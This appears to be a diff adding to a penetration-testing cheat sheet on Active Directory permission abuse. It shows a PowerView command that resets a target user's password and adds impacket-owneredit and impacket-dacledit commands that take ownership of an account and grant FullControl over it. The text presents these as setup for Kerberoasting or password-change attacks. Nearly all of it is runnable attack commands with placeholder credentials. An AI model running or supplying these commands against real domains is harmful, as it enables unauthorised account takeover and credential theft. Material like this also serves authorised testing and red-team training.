@@ -78,3 +78,15 @@ Change the password of a user
     Import-Module .\PowerView.ps1
     $NewPassword = ConvertTo-SecureString 'Password1234' -AsPlainText -Force
     Set-DomainUserPassword -Identity 'TARGET_USER' -AccountPassword $NewPassword
+
+### WriteOwner
+
+#### 1) impacket-owneredit
+
+Grant Ownership (owneredit), then assign Full Control (dacledit), then perform Kerberoasting or Password Change attacks.
+
+    impacket-owneredit -action write -new-owner 'USER1' -target-dn 'CN=TARGET_USER,CN=Users,DC=domain,DC=local' 'domain.local'/'USER1':'Password@1' -dc-ip DC_IP
+
+#### 2) impacket-dacledit
+
+    impacket-dacledit -action 'write' -rights 'FullControl' -principal 'USER1' -target-dn 'CN=TARGET_USER,CN=Users,DC=domain,DC=local' 'domain.local'/'USER1':'Password@1' -dc-ip DC_IP
